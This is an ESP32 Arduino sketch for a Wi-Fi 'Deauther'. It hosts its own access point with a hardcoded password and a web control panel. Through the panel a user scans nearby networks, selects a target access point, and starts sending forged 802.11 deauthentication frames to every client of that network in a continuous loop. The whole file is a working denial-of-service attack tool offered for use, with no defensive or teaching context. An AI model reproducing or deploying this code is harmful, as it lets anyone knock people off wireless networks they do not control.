#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <ArduinoJson.h>

const char* ap_ssid = "GMpro";
const char* ap_password = "Sangkur87";

WebServer server(80);
uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool deauth_running = false;
uint8_t target_bssid[6] = {0};
uint8_t target_channel = 1;
int packet_count = 0;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
  uint8_t reason;
} __attribute__((packed)) deauth_frame_t;

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<title>ESP32 Deauther</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial; margin: 0; padding: 20px; background: #1a1a2e; color: white; }
.container { max-width: 800px; margin: auto; }
.card { background: #16213e; padding: 20px; margin: 10px 0; border-radius: 10px; }
button { background: #e94560; color: white; border: none; padding: 10px 20px; margin: 5px; border-radius: 5px; cursor: pointer; }
button.stop { background: #dc3545; }
button.scan { background: #28a745; }
select { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; }
.status { padding: 10px; border-radius: 5px; margin: 10px 0; }
.active { background: #dc3545; }
.inactive { background: #28a745; }
</style>
</head>
<body>
<div class="container">
<h1>ESP32 Deauther</h1>
<div class="card">
<h2>Status</h2>
<div id="status" class="status inactive">STOPPED</div>
<div id="packets">Packets: 0</div>
</div>
<div class="card">
<h2>Scan</h2>
<button class="scan" onclick="scan()">Scan Networks</button>
<select id="target_select"></select>
<div id="networks"></div>
</div>
<div class="card">
<h2>Attack</h2>
<button onclick="startAttack()">START</button>
<button class="stop" onclick="stopAttack()">STOP</button>
</div>
</div>
<script>
function updateStatus() {
  fetch('/status').then(r=>r.json()).then(d=>{
    document.getElementById('status').innerHTML = d.running ? 'RUNNING' : 'STOPPED';
    document.getElementById('status').className = 'status ' + (d.running ? 'active' : 'inactive');
    document.getElementById('packets').innerHTML = 'Packets: ' + d.packets;
  });
}
function scan() {
  fetch('/scan').then(r=>r.json()).then(d=>{
    let sel = document.getElementById('target_select');
    sel.innerHTML = '<option>Select target</option>';
    d.networks.forEach(n=>{
      let opt = document.createElement('option');
      opt.value = n.bssid + ',' + n.channel;
      opt.text = n.ssid + ' [' + n.bssid + '] CH:' + n.channel;
      sel.appendChild(opt);
    });
  });
}
function startAttack() {
  let val = document.getElementById('target_select').value;
  if(!val || val=='Select target') { alert('Scan and select target first'); return; }
  let [bssid, ch] = val.split(',');
  fetch('/start', {method:'POST', body:JSON.stringify({bssid:bssid, channel:parseInt(ch)})});
}
function stopAttack() { fetch('/stop', {method:'POST'}); }
setInterval(updateStatus, 1000);
</script>
</body>
</html>
)rawliteral";

void send_deauth_packet(uint8_t* target_mac, uint8_t* ap_mac, uint8_t reason, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  deauth_frame_t deauth;
  deauth.frame_ctrl = 0x00C0;
  deauth.duration = 0x013A;
  memcpy(deauth.dest, target_mac, 6);
  memcpy(deauth.src, ap_mac, 6);
  memcpy(deauth.bssid, ap_mac, 6);
  deauth.seq_ctrl = 0x1000;
  deauth.reason = reason;
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth, sizeof(deauth), false);
  packet_count++;
  delay(1);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  esp_wifi_set_promiscuous(true);
  
  server.on("/", [](){ server.send(200, "text/html", index_html); });
  server.on("/status", [](){ 
    server.send(200, "application/json", "{\"running\":" + String(deauth_running) + ",\"packets\":" + packet_count + "}");
  });
  server.on("/scan", [](){ 
    int n = WiFi.scanNetworks();
    String json = "{\"networks\":[";
    for(int i=0;i<n;i++){
      if(i>0) json+=",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",\"channel\":" + WiFi.channel(i) + "}";
    }
    json += "]}";
    WiFi.scanDelete();
    server.send(200, "application/json", json);
  });
  server.on("/start", HTTP_POST, [](){ 
    if(server.hasArg("plain")){
      String s = server.arg("plain");
      sscanf(s.c_str(), "{\"bssid\":\"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\",\"channel\":%hhu}", 
        &target_bssid[0], &target_bssid[1], &target_bssid[2], &target_bssid[3], &target_bssid[4], &target_bssid[5], &target_channel);
      deauth_running = true;
    }
    server.send(200, "application/json", "{\"status\":\"ok\"}");
  });
  server.on("/stop", HTTP_POST, [](){ deauth_running = false; server.send(200, "application/json", "{\"status\":\"ok\"}"); });
  server.begin();
}

void loop() {
  server.handleClient();
  if(deauth_running){
    send_deauth_packet(broadcast_mac, target_bssid, 0x07, target_channel);
    delay(50);
  }
  delay(10);
}
